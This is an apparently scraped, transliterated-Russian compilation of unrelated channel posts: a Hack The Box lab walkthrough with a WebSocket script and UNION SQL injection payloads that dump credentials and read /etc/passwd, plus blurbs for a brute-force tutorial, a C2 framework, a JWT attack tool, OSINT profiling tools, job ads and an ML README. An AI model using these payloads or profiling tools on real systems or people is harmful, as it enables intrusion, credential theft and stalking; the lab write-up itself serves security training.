Pishem Bruteforce dlia paneli PHPmyadmin s nulia: rabotaem, ispol'zuia Python3  Dobrogo vremeni sutok, kollegi, segodnia my s vami budem pisat' nebol'shuiu programmu dlia brutfors ataki na panel' avtorizatsii, na zamechatel'nom iazyke Python3.My s vami postaraemsia priderzhivat'sia paradigmy OOP v ee samom prostom vide, tak kak podderzhka i rasshirenie funktsionala dazhe v malen'kom prilozhenii bez primeneniia etogo mozhet stat' ves'ma zatrudnitel'nym delom.  Chitat': https://codeby.net/threads/pishem-bruteforce-dlja-paneli-phpmyadmin-s-nulja-rabotaem-ispolzuja-python3.74434/  #python #bruteforce #datebase

Chto kasaetsia redaktorov koda, tema ves'ma obshirnaia, tut vse zavisit ot lichnykh predpochtenii. Uncoded baziruetsia na populiarnom tekstovom redaktore VSCode, no, bez telemetrii. Poiavilsia on v sviazi s tem, chto razrabotchiki redaktora VSCodium otklonilis' ot svoikh pervonachal'nykh idei i perestali otkliuchat' telemetriiu, a Uncoded presleduet tsel' poluchit' polnyi analog VSCode no bez telemetrii. Chto kasaetsia redaktora koda VSCode, on lezhit na GitHub v otkrytom vide, to est', ego kod otkryt, po etomu i sushchestvuet vozmozhnost' sobrat' redaktor koda na ego osnove. Sobstvenno, imenno po etomu mozhno samomu sobrat' redaktor koda otkliuchiv telemetriiu. V itoge takoi sborki my poluchaem Code OSS -eto proekt s otkrytym iskhodnym kodom bez kakogo-libo proprietarnogo koda.

Hack The Box urov nia slozh nosti Insane. info Chi tai tak zhe: <<HTB CrossFit. Ras kru chiva em slozh nuiu XSS, chto by zakh vatit' khost>>. Razvedka Ad res mashiny -- 10.10.10.232, dobav liaem ego v /etc/hosts kak crossfit2.htb i pris tupa em k ska niro vaniiu por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. V ego rezul' tate ata kuiushchii uzna et, kakie sluzh by na khos te pri nima iut soedi nenie. Eta informa tsiia poz volia et vyb rat' dal' neishii put' k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov dlia Nmap (optsiia -A). Po lucha em sle duiushchie rezul' taty. Re zul' tat raboty skrip taItak, my ime em tri otkry tykh por ta: 22 -- sluzh ba OpenSSH 8.4; 80 -- veb-ser ver OpenBSD httpd PHP/7.4.12; 8953 -- sluzh ba Unbound. Per vym delom sto it zag lianut' na dos tupnyi sait. Star tovaia stra nitsa sai ta Skanirovanie veb-kontenta Chto by nichego ne osta los' nezame chen nym, informa tsiiu na sai te budem sobirat' cherez Proxy. V shap ke sai ta nakhodim naviga tsiiu, a tak zhe opre delia em, chto pos ledniaia ssyl ka vedet na dru goi pod domen: employees.crossfit.htb. Dobavim ego v fail /etc/hosts, tak zhe izme nim ime iushchuiusia u nas zapis' s crossfit2.htb na crossfit.htb. 10. 10. 10. 232 crossfit. htb employees. crossfit. htb Na samom sai te nas vstre chaet for ma avto riza tsii, bol' she nichego my tam ne poluchim. Tak kak vse nashi dei stviia fik sirova ny v Burp, zag lianem v Burp History. Tam my obna ruzhim, chto pri obra shchenii k glav noi stra nitse dela etsia zap ros na eshche odin pod domen. Vklad ka Burp HistoryDo bavim etot pod domen v fail /etc/hosts i pov torim zap ros k glav noi stra nitse. Zatem otpra vim sia v Burp i pro verim otvet, kotoryi ver nul ser ver pri zap rose k novomu pod domenu. 10. 10. 10. 232 crossfit. htb employees. crossfit. htb gym. crossfit. htb Vklad ka Burp HistoryV otve te vidim opo veshche nie o sme ne pro toko la na WebSocket. Tochka vkhoda WebSocket WebSocket -- eto pro tokol svia zi poverkh TCP-soedi neniia, pred nazna chen nyi dlia obme na soob shcheni iami mezh du bra uze rom i veb-ser verom v rezhime real' nogo vre meni. WebSocket oso ben no khorosh dlia ser visov, kotorye nuzh daiut sia v pos toian nom obme ne dan nymi, nap rimer dlia onlai novykh igr, tor govykh plo shchadok, chatov. Pos le usta nov leniia soedi neniia uzhe net deleniia na kli ent i ser ver, a est' dva rav noprav nykh uchas tni ka obme na dan nymi. Kazh dyi rabota et sam po sebe i, kog da nado, otprav liaet dan nye dru gomu. Dlia pros motra soob shchenii po pro toko lu WebSocket perei dem k Burp WebSocket History. Tam nakhodim edins tven noe soob shchenie, v soder zhimom kotoro go budet pri vets tvie, informa tsiia o koman de help i kakoi-to token. Vklad ka Burp WebSocket HistoryRa botat' s WebSocket budet udob no s pomoshch'iu inte rak tivnoi kon soli. Ee nes lozhno orga nizo vat' pri pomoshchi Python 3 i modulia websockets. python3 -m websockets ws:/ / gym. crossfit. htb/ ws/ Us tanov lenie soedi neniia WebSocketsPos le pod kliu cheniia nam sra zu prish lo zna komoe soob shchenie. Davai pop robu em poluchit' sprav ku. Soob shchenie s koman doi nuzh no budet otpra vit' tozhe v JSON. { "command" : "help" } Zap ros sprav kiV otve te nam soob shchaiut o never nom tokene, poeto mu pov toria em otprav ku, no vkliu chaem novyi parametr. { "command" : "help" , "token" : "29a20a82768c1531e28fe18a519a59fbe986801ebdcd543920dbe3bdaa8c20d9" } Pov tornyi zap ros sprav kiNa she soob shchenie osta etsia bez otve ta, a pos le pov tornoi otprav ki nam voob shche soob shchaiut, chto token bol' she ne dei stvi telen i daiut novyi token. Inte res no! Davai poishchem frag ment koda, kotoryi otve chaet za otprav ku soob shchenii. V paneli bra uze ra perekho dim k vklad ke Debug i nakhodim fail ws.min.js. Pov tornyi zap ros sprav kiV kode nakhodim otprav ku soob shcheniia v paramet re message i tokena -- v paramet re token. Otprav liaem svoe soob shchenie v ana logich nom for mate. { "message" : "help" , "token" : "cdfc745eb97670fb768678a2fbe3d37eabd307dac630720392892e5525ad87f8" } Pov tornyi zap ros sprav kiNa konets nam pri shel otvet, otku da my uzna em o trekh dos tupnykh koman dakh: coaches, classes i memberships. Ot pra vim vse tri koman dy i vni matel' no pos motrim na otvet ser vera. Ko man da coaches Ko man da classes Ko man da membershipsVo vsekh slu chaiakh nam ver nuli HTML-kod stra nitsy. V per vom vari ante my polucha em pros to informa tsiiu o tre nerakh, vo vto rom -- spi sok zaniatii, a vot v otvet na koman du memberships zaod no so spis kom pri ezzha et vybor optsii. Reali zovan on kak fun ktsiia check_availability, v kotoruiu pereda etsia chis lo ot 1 do 4. Pos motrim kod etoi fun ktsii v uzhe zna komom fai le ws.min.js. Kod fun ktsii check_availabilityFun ktsiia otprav liaet tri paramet ra: message -- soder zhit stro ku available; params -- chis lo, peredan noe v fun ktsiiu; token. { "message" : "available" , "params" : "1" , "token" : "6775bfe48d278f7a5bc90dcb6c0e9b47e8cfcfa266446ef8345f9e01e83e6233" } Ot prav ka soob shcheniia availableV etom soob shchenii ia otpra vil chetyre paramet ra i poluchil dva raz nykh vari anta otve ta: uspeshnyi i net. Pri etom my eshche polucha em poias nenie v paramet re debug. To est' my otprav liaem parametr, kotoryi sis tema obra baty vaet i daet rezul' tat, a zna chit, eto mes to dlia tes tirova niia! Dal' she ia napisal skript na Python 3, kotoryi v tsik le zap rashiva et parametr. #!/ usr/ bin/ python3 import json from websocket import create_connection def send_command ( ws , token ) : inp = input ( "> " ) ws . send ( '{ "message": "available", "params": "' + inp + '", "token": "' + token + '"} ' ) req = ws . recv ( ) token = json . loads ( req ) [ 'token' ] print ( req ) return token ws = create_connection ( "ws:// gym. crossfit. htb/ ws/ " ) req = ws . recv ( ) token = json . loads ( req ) [ 'token' ] for _ in range ( 100 ) : token = send_command ( ws , token ) Re zul' tat raboty skrip taVse rabota et, idem dal' she. SQL Injection Tak kak otvet vybira etsia v zavisi mos ti ot otprav lenno go paramet ra, per vym delom ia reshil pro verit' SQL-in' ektsiiu. Bla go ia reguliar no sos tavliaiu slo vari dlia tes tov i nuzh nyi kak raz imel sia pod rukoi. Chto by ispol' zovat' ego, nem nogo pod pra vim kod. import json import time from websocket import create_connection def send_command ( ws , token ) : inp = input ( "> " ) ws . send ( '{ "message": "available", "params": "' + inp + '", "token": "' + token + '"} ' ) req = ws . recv ( ) token = json . loads ( req ) [ 'token' ] print ( req ) return token def send_command2 ( ws , token , inp ) : print ( "input:  " ) ws . send ( '{ "message": "available", "params": "' + inp + '", "token": "' + token + '"} ' ) req = ws . recv ( ) token = json . loads ( req ) [ 'token' ] print ( req ) return token ws = create_connection ( "ws:// gym. crossfit. htb/ ws/ " ) req = ws . recv ( ) token = json . loads ( req ) [ 'token' ] with open ( '/ home/ ralf/ tmp/ wordlists/ SQL/ 1. check_sqli. txt' , 'r' ) as f : wordlist = f . read () . split ( ' n ' )[ : - 1 ] for w in wordlist : token = send_command2 ( ws , token , w ) Re zul' tat raboty skrip taPri otprav ke liubogo soob shcheniia, soder zhashchego dvoi nuiu kavych ku ("), otve ta my ne polucha em. Po etoi pri chine iskliu chim iz slo varia liubuiu nag ruzku, soder zhashchuiu etot sim vol. I pov torim vypol nenie. Re zul' tat raboty skrip ta Re zul' tat raboty skrip ta (pro dol zhenie)Pros matri vaia vyvod, obna ruzhim reak tsiiu ser vera na chetyre nag ruzki. Smot rim kom menta rii SQL: 1 and 1 i 1 and true ver net dei stvi tel' nyi otvet; 1 and 0 i 1 and false ver net nash vvod; 1 -- - ver net dei stvi tel' nyi otvet. Ia nashel uiaz vimost', i teper' ee nuzh no eks plu ati rovat'. Per vym delom nai dem nag ruzki dlia eks plu ata tsii, poeto mu sme nim slo var' i pov torim vypol nenie skrip ta. Re zul' tat raboty skrip ta Re zul' tat raboty skrip ta (pro dol zhenie)V rezul' tate est' reak tsiia na UNION-nag ruzki. A imen no pri otprav ke -1 UNION ALL SELECT 1,2# poluchim otvet, parametr name kotoro go soder zhit 2, a pri otprav ke -1 UNION ALL SELECT USER(),SLEEP(5)--, v paramet re id otve ta pri suts tvu et imia pol' zovate lia bazy dan nykh. Takaia uiaz vimost' nazyva etsia UNION SQL Injection i poz volia et dobavit' k vybor ke stol btsy tab litsy, kotorye ranee byli nam ne vid ny. Ver nem pos lednie dve stro ki nashego per vonachal' nogo skrip ta dlia ruch noi raboty i pris tupim k eks plu ata tsii. for _ in range ( 100 ) : token = send_command ( ws , token ) Per vym delom poluchim ver siiu bazy dan nykh. -1 UNION ALL SELECT 1, @@version # Ver siia bazy dan nykhNa khos te rabota et MySQL, poeto mu dal' she my budem ispol' zovat' ee sin taksis. Poluchim ime na vsekh ime iushchikh sia baz. My mozhem vyvodit' vse go odnu stro ku, poeto mu ispol' zuem fun ktsiiu GROUP_CONCAT dlia ob' edi neniia nes kol' kikh strok v odnu, a raz delite lem budet pro bel. -1 UNION ALL SELECT 1, GROUP_ CONCAT ( schema_ name, ' ' ) FROM information_ schema. schemata # Spi sok imen bazBa za information_schema slu zheb naia, poeto mu nas ne inte resu et. Davai uzna em pri vile gii nashego pol' zovate lia v dru gikh bazakh. Pri vile gii pol' zovate lia dlia bazMy mozhem rabotat' kak s bazoi crossfit, tak i s bazoi employees. Dlia nachala poluchim naz vaniia tab lits. Tab litsy v bazakh crossfit i employeesV baze crossfit nichego inte res nogo ne nash los' -- nadezh du podava la tab litsa password_reset, no ona oka zalas' pus toi. Po luchim naz vaniia stol btsov v tab litse employees. Stol btsy v tab litse employeesMy mozhem poluchit' uchet nye dan nye dlia sai ta. Zap rosim ime na, paroli i adre sa elek tron noi poch ty. So der zhimoe tab litsy employeesU nas est' chetyre pol' zovate lia i kheshi ot ikh parolei. S pomoshch'iu uti lity hashid opre delim tip kheshei. Re zul' tat raboty hashidNa ibo lee vero iatnym budet khesh SHA-256 iz-za ego populiar nosti, odna ko s nas koka slo mat' kheshi i avto rizo vat' sia na sai te ne vysh lo. Ni v onlai novykh bazakh, ni s pomoshch'iu lokal' nogo perebo ra uznat' khot' odin iz pro obra zov khesha ne uda los'. Poeto mu pos motrim, kakie eshche u nashego pol' zovate lia bazy dan nykh est' pri vile gii. Pri vile gii pol' zovate lia bazy dan nykhMy mozhem chitat' fai ly na khos te! Per vym delom, konech no zhe, pro chita em /etc/passwd. -1 UNION ALL SELECT 1, LOAD_ FILE ( '/ etc/ passwd' ) # Na khodim pol' zovate lei node, david i john, u kotorykh est' voz mozhnost' loginit' sia v sis temu. A pos kol' ku my ime em delo s OpenBSD, abso liut no vse sluzh by tozhe otra zheny v etom fai le. Pros motrev etot spi sok, otme tim demon relayd, kotoryi mozhet dat' nam novye adre sa, i unbound, tak kak u nego est' dos tup na vnesh nii port 8953. Sna chala pos motrim nas troi ki releia, pro chitav fail /etc/relayd.conf. -1 UNION ALL SELECT 1, LOAD_ FILE ( '/ etc/ relayd. conf' ) # So der zhimoe fai la /etc/relayd.confTak my nakhodim eshche odin domen crossfit-club.htb, kotoryi dobavim v fail /etc/hosts. Sra zu pros motrim odno imen nyi sait, kotoryi nas vstre chaet for moi avto riza tsii. For ma avto riza tsiiTak kak zap rosy my po-prezh nemu dela em cherez Burp Proxy, nam eto pomoga et opre delit' pod kliu chenie neko ego API, o chem govorit obra shchenie k /api/auth. Vklad ka Burp HistoryPri popyt ke avto riza tsii s tes tovymi uchet nymi dan nymi obna ruzhi vaem eshche odnu stra nitsu, kotoraia rabota et s for matom JSON. Vy pol nenie zap rosa na avto riza tsiiuK tomu zhe na sai te ime etsia for ma regis tra tsii. Knop ka v nei mozhet byt' i otkliu chena, no my mozhem pop robovat' vse rav no avto rizo vat' sia -- pri pomoshchi Burp Repeater. Poluchim ime na peremen nykh iz iskhodno go koda stra nitsy i otpra vim tes tovye dan nye na /api/signup. No v otve te nam ska zhut, chto eta fun ktsiia dos tupna tol' ko admi nis tra toru. For ma regis tra tsii Vy pol nenie zap rosa na regis tra tsiiuTut poka bol' she nichego ne sde lat', poeto mu idem dal' she.

Whalemap - eto platforma, kotoraia obsluzhivaet investorov i treiderov kriptovaliutnogo rynka. My predostavliaem pol'zovateliu dostup k intuitivno poniatnoi i nadezhnoi analitike kriptovaliutnogo rynka. Na dannyi moment my imeem okolo 30k aktivnykh pol'zovatelei. V dobavok k nashemu startaperskomu dukhu u nas dostatochno zrelyi prodakshen.   Kakoi nuzhen stek?  Python3, Django/Flask, Numpy, Pandas, Plotly, Nginx

Bekend-razrabotchik Python (Middle) v Whoer (whoer.net) / ot 85 000 rub.  VAZhNO!  My rassmatrivaem kandidatov, tol'ko s OPYTOM RABOTY    Osnovnaia zadacha: Realizovat' perekhod tekushchego bekenda proekta s Perl na Python.  + Uluchshenie i podderzhka tekushchego proekta (napisanie veb-API, konfiguratsiia optimizatsiia veb-arkhitektury i t.p.)    Trebovaniia:  - uverennoe znanie Python3  - opyt raboty s Flask  - opyt s Django Rest Framework  - rabota s Git, Redis, MySQL  - rabota s API    Zhelatel'no:  + znanie, umenie chitat' kod Perl  + opyt ispol'zovaniia veb-freimvorka Mojolicious,    Budet pliusom:  + bazovye navyki administrirovaniia Linux / DevOps  + znanie mikroservisnoi arkhitektury    Usloviia:  Gibkii grafik raboty, vozmozhna polnaia udalionnaia rabota    Dopolnitel'nye instruktsii  Privetstvuem nalichie akkaunta na github    Dlia otklika na vakansiiu pishite na pochtu whoerstat@yandex.com, i my vam otvetim!

Obolochka rabochego stola XFCE sama po sebe obladaet ves'ma gibkimi nastroikami i vozmozhnost'iu k kastomizatsii. Pravda, stoit srazu ogovoritsia, chto v voprose kastomizatsii sistemy na pervom meste stoit vse zhe KDE s ee obshirnymi nastroikami. No, o nei kak-nibud' v sleduiushchii raz, a seichas pogovorim o tom, kak sozdat' tak nazyvaemyi Blur effekt v XFCE4. Dannyi effekt mozhno sozdat' ne rodnymi sredstvami sistemy, a ustanovkoi storonnikh prilozhenii. V itoge poluchitsia razmytyi fon otkrytykh prilozhenii, to est' okon.

Privet! V stels rezhime razrabatyvaem nativnyi ML-heavy iOS app nebol'shoi komandoi vysokoklassnykh spetsialistov (nashi klienty ili byvshie rabotodateli - Yandex, Sber, Mail.ru, Samsung, PwC Russia, Tinkoff, ivi, etc). Osnovateli i kliuchevye chleny komandy - vypuskniki Mekhmata i Fizfaka MGU, proekt predpolagaet vykhod na mezhdunarodnyi rynok. V bekend-chasti est' arkhitektor, ishchem emu v pomoshch' junior python razrabotchika / stazhera. Otlichnaia vozmozhnost' poluchit' boevoi opyt v bystro razvivaiushchemsia servise bez legasi pod rukovodstvom opytnykh kolleg, nauchit'sia stroit' pravil'nuiu mikroservisnuiu arkhitekturu, po-vzroslomu deploit' rekomendatel'nuiu sistemu i drugie modeli mashinnogo obucheniia s ispol'zovaniem vsego bogatstva infrastruktury AWS.     Kogo ishchem: Junior Backend razrabotchikov (Python)   Lokatsiia: udalenno,    Format raboty: udalenno, pri zhelanii mozhem vstrechat'sia v ofise na Krasnom Oktiabre   Zaniatost': proektnaia rabota, zaniatost' full time   Uroven' dokhoda: obsuzhdaetsia individual'no   Zadachi:   Razrabotka biznes-logiki, sistemy deploia ML modelei, raspredelennogo kraulera   Testirovanie sobstvennogo koda   Pri zhelanii mozhno uchastvovat' v proektirovanii arkhitektury i brat' na sebia devops zadachi   Stek:    Python3, Django, PostgreSQL, aiohttp, RabbitMQ, ElasticSearch budet pliusom   Trebovaniia:   opyt razrabotki na python3, uverennoe znanie struktur dannykh, bazovykh algoritmov i patternov proektirovaniia   vladenie stekom git, bash, zhelatel'no SQL, Docker   motivatsiia k razvitiiu i obucheniiu, otvetstvennost'   Budut pliusami opyt raboty s mikroservisnoi arkhitekturoi i oblachnymi tekhnologiiami, umenie pisat' asinkhronnyi kod, opyt s AWS  Kontakty: https://t.me/maxpetriev

Nakhodim sviazi profilei v sotsial'nykh setiakh s Social Mapper!  Social Mapper -- Utilita prednaznachennaia dlia poiska profilei liudei v sotsial'nykh setiakh. Algoritm raboty programmy zakliuchaetsia v tom, chto ona ishchet profili iskhodia iz zadannykh dannykh (naprimer, imia pol'zovatelia), a zatem ispol'zuia sobstvennuiu tekhnologiiu raspoznavaniia lits otbiraet tol'ko akkaunty imeiushchie otnosheniia k iskomomu litsu.   Ustanovka:    git clone https://github.com/SpiderLabs/social_mapper.git    cd social_mapper/setup    pip install -r requirements.txt  Ispol'zovanie:    python3 social_mapper.py --help

Poluchaem vsiu informatsiiu iz akkaunta v Instagram    Instrument Instagram OSINT poluchaet iz akkaunta Instagram tselyi riad informatsii, kotoraia vkliuchaet v sebia:    - Profile: identifikator pol'zovatelia, podpischiki / following, kolichestvo zagruzok, profil' img URL, business enum, vneshnii URL, nedavno prisoedinennyi i t. d  - Tags & mentions: naibolee chasto ispol'zuemye kheshtegi i upomianutye akkaunty  - Email: esli kakoi-libo adres elektronnoi pochty ispol'zuetsia tam, gde on budet otobrazhat'sia  - Posts: dostupnaia podpis', mestopolozhenie, vremennaia metka, podpis', url-adres izobrazheniia i t. d    Ustanovka:    #pkg install -y git  #git clone https://github.com/th3unkn0n/osi.ig.git && cd osi.ig  #python3 -m pip install -r requirements.txt    Ispol'zovanie:    #python3 main.py -u username    Vsia informatsiia na GitHub

PickleC2 is a post-exploitation and lateral movements framework.  DocumentationReadTheDocs  OverviewPickleC2 is a simple C2 framework written in python3 used to help the community in Penetration Testers in their red teaming engagements.  PickleC2 has the ability to import your own PowerShell module for Post-Exploitation and Lateral Movement or automate the process.  FeaturesThere is a one implant for the beta version which is powershell.      PickleC2 is fully encrypted communications, protecting the confidentiality and integrity of the C2 traffic even when communicating over HTTP.      PickleC2 can handle multiple listeners and implants with no issues      PickleC2 supports anyone who would like to add his own PowerShell Module      Future FeaturesIn the up coming updates pickle will support:      Go Implant      Powershell-Less Implant that don't use System.Management.Automation.dll.      Malleable C2 Profile will be supported.      HTTPS communications will be supported. NOTE: Even HTTP communications is fully encrypted... #commandandcontrol #picklec2

TikTok-OSINT v Termux  OSINT- Razvedyvatel'naia distsiplina, vkliuchaiushchaia v sebia poisk, vybor i sbor razvedyvatel'noi informatsii iz obshchedostupnykh istochnikov, a takzhe eio analiz.  Ustanovka  Obnovliaem pakety:  $ apt update  $ apt upgrade    Ustanavlivaem git:  $ pkg install git -y    Ustanavlivaem python:  $ pkg install python -y    Ustanavlivaem repozitorii:  $ git clone https://github.com/sc1341/TikTok-OSINT.git    Perekhodim v repozitorii:  $ cd TikTok-OSINT    Ustanovka utility  $ pip3 install requests $ pip3 install beautifulsoup4 $ pip3 install argparse   Ispol'zovanie  $ python3 tiktokOSINT.py --username USERNAMEHERE --downloadProfilePic    Skript vydast sleduiushchie dannye: imia profilia, fotografii, podpischiki, podpiski, dannye o profile, ID, kolichestvo video/laikov i podtverzhden li akkaunt.  ----------------------------------------- Nashi proekty:  YouTube: vk.cc/bWMyTS  VK: vk.cc/bWMyVZ  Telegram: vk.cc/bWMyWY  ----------------------------------------- Chaty nashego proekta:  VK: vk.cc/bWMyYz  Telegram: vk.cc/bWMz0h  ----------------------------------------- Igrovaia zona i ne tol'ko:  Discord: vk.cc/bX5nij  -----------------------------------------

Dostupen Uncoded, variant redakt VSCode bez telemetrii  Avtory VSCodium otstupili ot iznachal'nykh idei, glavnoi iz kotorykh bylo otkliuchenie telemetrii. Sozdat' fork bez telemetrii okazalos' proshche, chem dostuchat'sia do avtorov, i ukazat' im na to, chto telemetriiu oni pochti ne vyrezaiut i mesiatsami ignoriruiut soobshcheniia o problemakh s tegom "telemetry". Po suti, dlia ochistki i sborki VSCode OSS ispol'zuiutsia lish' 2 bash-skripta, odin iz kotorykh - pozaimstvovan iz proekta VSCodium, no vozmozhno v skorom vremeni budet perepisan.  Dlia Debian/Ubuntu protsess sborki vygliadit tak:    sudo apt-get install build-essential g++ libx11-dev libxkbfile-dev libsecret-1-dev python-is-python3   BUILD_DEB=true ./build.sh   Posle etogo v direktorii proekta ostaiotsia sborka Linux-x86_64 i, vozmozhno, deb- ili rpm-paket, pri ukazanii sootvetstvuiushchei peremennoi okruzheniia (BUILD_DEB=true ili BUILD_RPM=true).

A tool to test security of JSON Web Tokens.  Test a JWT against all known CVEs;    Tamper with the token payload: changes claims and subclaims values.  Exploit known vulnerable header claims (kid, jku, x5u)  Verify a token  Retrieve the public key of your target's ssl connection and try to use it in a key confusion attack with one option only  All JWAs supported  Generates a JWK and insert it in the token header  And much, much more!Wiki    InstallationN.B. Cloning the repository should be avoided except for development purposes!  N.B. Deb package has to be considered beta    N.B. python3-pip package is required to install dependencies, be sure to have it installed.  Who this tool is written for?      Web Application Penetration Tester / Bug Bounty Hunters    This tool has been written with the aim of become a key part of pentesters toolkit.        Devs who need to test the secuirty of JWTs used in their applications      CTF Players      Not For Students    Since this tool automates lot of stuff, without force the user to know what's happening under the hood, it won't  help you to understand the vulnerabilities it exploits... #jwt #jwtexploit #jwtxploiter #x5uinjection..

AvtoVideo: Avtomatizirovannaia Sistema Raspoznavaniia Videodeistvii  AutoVideo-eto sistema dlia avtomaticheskogo analiza video. On razrabotan na osnove infrastruktury D3M, kotoraia opisyvaet mashinnoe obuchenie s ispol'zovaniem universal'nykh konveiernykh iazykov. V nastoiashchee vremia on fokusiruetsia na raspoznavanii videodeistvii, podderzhivaia razlichnye sovremennye algoritmy raspoznavaniia videodeistvii. On takzhe podderzhivaet avtomaticheskii vybor modeli i nastroiku giperparametrov. AvtoVideo razrabotano Laboratoriei DANNYKh Universiteta Raisa. Paper: https://arxiv.org/abs/2108.04212 Tutorial: [Towards Data Science] AutoVideo: An Automated Video Action Recognition System Related Project: TODS: Automated Time-series Outlier Detection System   Sushchestvuiut i drugie biblioteki videoanaliza, no eta razrabotana s vysokoi stepen'iu modul'nosti. AutoVideo legko rasshiriaetsia blagodaria iazyku konveiera, gde kazhdaia model' upakovana v vide primitiva s nekotorymi giperparametrami. Eto pozvoliaet nam legko podderzhivat' drugie algoritmy dlia drugikh zadach analiza video, kotorye budut nashimi budushchimi usiliiami. Takzhe udobno osushchestvliat' poisk modelei i giperparametrov s pomoshch'iu iazyka konveiera.There are some other video analysis libraries out there, but this one is designed to be highly modular. AutoVideo is highly extendible thanks to the pipeline language, where each model is wrapped as a primitive with some hyperparameters. This allows us to easily support other algorithms for other video analysis tasks, which will be our future efforts. It is also convenient to search models and hyperparameters with the pipeline language.  Obzor biblioteki pokazan nizhe. Kazhdyi modul' v AutoVideo upakovan v vide primitiva s nekotorymi giperparametrami. Konveier sostoit iz riada primitivov ot predvaritel'noi obrabotki do raspoznavaniia deistvii. AutoVideo osnashchen tiunerami dlia poiska modelei i giperparametrov. My privetstvuem vklad v obogashchenie AvtoVideo bol'shim kolichestvom primitivov. Vy mozhete naiti instruktsii v Rukovodstve po vkladu.  Protsitiruite etu rabotu  Esli vy sochtete eto repo poleznym, vy mozhete protsitirovat':  Chzha, Daochen i dr. "AvtoVideo: Avtomatizirovannaia Sistema Raspoznavaniia Video Deistvii". Preprint arXiv arXiv:2108.0421 (2021).  @article{zha2021autovideo, title={AutoVideo: An Automated Video Action Recognition System}, author={Zha, Daochen and Bhat, Zaid and Chen, Yi-Wei and Wang, Yicheng and Ding, Sirui and Jain, Anmoll and Bhat, Mohammad and Lai, Kwei-Herng and Chen, Jiaben and Zou, Na and Hu, Xia}, journal={arXiv preprint arXiv:2108.04212}, year={2021} }  Ustanovka  Ubedites', chto u vas ustanovleny Python 3.6 i pip. V nastoiashchee vremia kod testiruetsia tol'ko v sisteme Linux. Vo-pervykh, ustanovite torch i torchvision s  pip3 install torch pip3 install torchvision   Chtoby ispol'zovat' avtomaticheskii poisk, vam neobkhodimo ustanovit' ray-tune i hyperopt sTo use the automated searching, you need to install ray-tune and hyperopt with   pip3 install 'ray[tune]' hyperopt   My rekomenduem ustanovit' stabil'nuiu versiiu autovideo s pomoshch'iu pip::   pip3 install autovideo   Krome togo, vy mozhete klonirovat' posledniuiu versiiu s pomoshch'iu  git clone https://github.com/datamllab/autovideo.git   Zatem ustanovite s pomoshch'iu   cd autovideo pip3 install -e .  Zatem ustanovite s igrushechnymi primerami  Chtoby poprobovat' primery, vy mozhete zagruzit' nabor dannykh hmdb6, kotoryi iavliaetsia podmnozhestvom hmdb51 tol'ko s 6 klassami. Vse nabory dannykh mozhno zagruzit' s Google Diska. Zatem vy mozhete raspakovat' nabor dannykh i pomestit' ego v nabory dannykh.  Ustanovka i sokhranenie truboprovoda  python3 examples/fit.py  Nekotorye vazhnye giperparametry zakliuchaiutsia v sleduiushchem.  --alg: podderzhivaemyi algoritm. V nastoiashchee vremia my podderzhivaem tsn, tsm, i3d, eco, eco_full, c3d, r2p1d i r3d. --predvaritel'naia podgotovka: bud' to zagruzka predvaritel'no podgotovlennykh vesov i tochnaia nastroika. --gpu: kakoe ustroistvo gpu ispol'zovat'. Pustaia stroka dlia protsessora. --data_dir: katalog nabora dannykh --log_dir: put' dlia sokhraneniia zhurnala --save_dir: put' dlia sokhraneniia ustanovlennogo konveiera  Zagruzka ustanovlennogo truboprovoda i sostavlenie prognozov  Posle ustanovki truboprovoda vy mozhete zagruzit' truboprovod i sdelat' prognozy.  python3 examples/produce.py  Nekotorye vazhnye giperparametry zakliuchaiutsia v sleduiushchem.  --gpu: kakoe ustroistvo gpu ispol'zovat'. Pustaia stroka dlia protsessora. --data_dir: katalog nabora dannykh --log_dir: put' dlia sokhraneniia zhurnala --load_dir: put' dlia zagruzki ustanovlennogo truboprovoda  Zagruzka ustanovlennogo truboprovoda i povtornye deistviia  Posle ustanovki konveiera vy takzhe mozhete sozdavat' predskazaniia na odnom video. V kachestve demonstratsii vy mozhete zagruzit' vstroennyi konveier i demonstratsionnoe video s Google Diska. Zatem vy mozhete ispol'zovat' sleduiushchuiu komandu, chtoby raspoznat' deistvie v video:  python3 examples/recogonize.py  Nekotorye vazhnye giperparametry zakliuchaiutsia v sleduiushchem.  --gpu: kakoe ustroistvo gpu ispol'zovat'. Pustaia stroka dlia protsessora. --video_path: put' k videofailu --log_dir: put' dlia sokhraneniia zhurnala --load_dir: put' dlia zagruzki ustanovlennogo truboprovoda  Montazh i izgotovlenie truboprovoda  V kachestve al'ternativy vy mozhete vypolnit' podgonku i izgotovlenie bez sokhraneniia modeli s pomoshch'iu  python3 examples/fit_produce.py  Nekotorye vazhnye giperparametry zakliuchaiutsia v sleduiushchem.  --alg: podderzhivaemyi algoritm. --predvaritel'naia podgotovka: bud' to zagruzka predvaritel'no podgotovlennykh vesov i tochnaia nastroika. --gpu: kakoe ustroistvo gpu ispol'zovat'. Pustaia stroka dlia protsessora. --data_dir: katalog nabora dannykh --log_dir: put' dlia sokhraneniia zhurnala  Avtomaticheskii poisk  V dopolnenie k samostoiatel'nomu zapusku, my takzhe podderzhivaem avtomaticheskii vybor modeli i nastroiku giperparametrov:  python3 examples/search.py  Nekotorye vazhnye giperparametry zakliuchaiutsia v sleduiushchem.  --alg: algoritm poiska. V nastoiashchee vremia my podderzhivaem random i hyperopt. --num_samples: kolichestvo obraztsov, kotorye nuzhno poprobovat' --gpu: kakoe ustroistvo gpu ispol'zovat'. Pustaia stroka dlia protsessora. --data_dir: katalog nabora dannykh  Podderzhivaemye Algoritmy  Supported Algorithms  Algorithms Primitive Path Paper TSN autovideo/recognition/tsn_primitive.py Temporal Segment Networks: Towards Good Practices for Deep Action Recognition TSM autovideo/recognition/tsm_primitive.py TSM: Temporal Shift Module for Efficient Video Understanding R2P1D autovideo/recognition/r2p1d_primitive.py A Closer Look at Spatiotemporal Convolutions for Action Recognition R3D autovideo/recognition/r3d_primitive.py Learning spatio-temporal features with 3d residual networks for action recognition C3D autovideo/recognition/c3d_primitive.py Learning Spatiotemporal Features with 3D Convolutional 